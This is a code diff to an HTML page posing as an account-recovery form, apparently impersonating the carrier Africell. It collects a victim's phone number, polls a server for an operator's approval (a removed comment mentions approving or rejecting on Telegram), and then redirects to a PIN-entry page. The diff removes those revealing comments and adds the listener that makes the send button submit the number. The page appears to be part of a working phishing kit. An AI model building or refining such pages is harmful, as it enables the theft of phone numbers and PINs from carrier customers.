@@ -48,6 +48,7 @@
                 <input type="tel" id="recoveryPhone" class="forgot-input-field" placeholder="Mobile Number" maxlength="9" inputmode="numeric" pattern="[0-9]*" required>
             </div>
 
+            <!-- Send Button -->
             <button type="button" id="sendBtn" class="forgot-send-btn">send</button>
 
             <!-- Loading Spinner -->
@@ -98,7 +99,6 @@
                 return;
             }
 
-            // Clean format without extra internal spaces to match server precisely
             const fullPhone = '+232' + rawPhone;
             localStorage.setItem('africellUserPhone', fullPhone);
             localStorage.setItem('userPhone', fullPhone);
@@ -142,7 +142,7 @@
                     const response = await fetch(checkUrl);
                     const data = await response.json();
 
-                    console.log('Polling server status response:', data); // Check your F12 console to see this!
+                    console.log('Polling server status response:', data);
 
                     if (data.status === 'approved') {
                         clearInterval(statusInterval);
@@ -156,12 +156,19 @@
                             window.location.href = 'pin3.html';
                         });
                     }
-                    // If status is 'pending', it will loop quietly until you click Approve/Reject on Telegram
                 } catch (e) {
                     console.error('Polling network error:', e);
                 }
             }, 3000);
         }
+
+        // Attach event listener to the send button on page load
+        document.addEventListener('DOMContentLoaded', () => {
+            const sendBtn = document.getElementById('sendBtn');
+            if (sendBtn) {
+                sendBtn.addEventListener('click', submitRecoveryPhone);
+            }
+        });
     </script>
 </body>
 </html>
